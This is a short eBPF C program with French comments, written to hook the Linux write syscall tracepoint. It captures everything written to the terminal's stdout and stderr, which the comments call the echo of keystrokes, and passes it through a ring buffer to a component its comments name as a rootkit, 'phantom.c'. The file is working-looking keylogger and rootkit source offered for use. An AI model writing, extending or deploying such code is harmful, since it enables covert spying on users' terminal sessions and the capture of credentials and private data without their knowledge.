#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "config.h"

// Map RingBuffer pour envoyer les données au userspace
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} tty_rb SEC(".maps");

// TRACEPOINT : C'est la méthode stable pour Linux 6.x
// On intercepte l'appel système 'write' à l'entrée
SEC("tracepoint/syscalls/sys_enter_write")
int trace_write(struct trace_event_raw_sys_enter *ctx) {
    // args[0] = File Descriptor. 1 = STDOUT (Terminal), 2 = STDERR
    unsigned int fd = ctx->args[0];
    
    // On capture uniquement ce qui est écrit dans le terminal (l'écho des touches)
    if (fd != 1 && fd != 2) return 0;

    // args[2] = count (taille des données)
    size_t count = ctx->args[2];
    if (count == 0) return 0;

    // Réservation de l'espace dans le buffer
    struct event *e;
    e = bpf_ringbuf_reserve(&tty_rb, sizeof(*e), 0);
    if (!e) return 0;

    e->pid = bpf_get_current_pid_tgid() >> 32;
    e->len = (count > MAX_DATA_SIZE) ? MAX_DATA_SIZE : count;

    // args[1] = char *buf (le contenu écrit)
    // On copie les données depuis l'espace utilisateur vers notre event
    bpf_probe_read_user(&e->data, e->len, (void *)ctx->args[1]);

    // Envoi au rootkit (phantom.c)
    bpf_ringbuf_submit(e, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
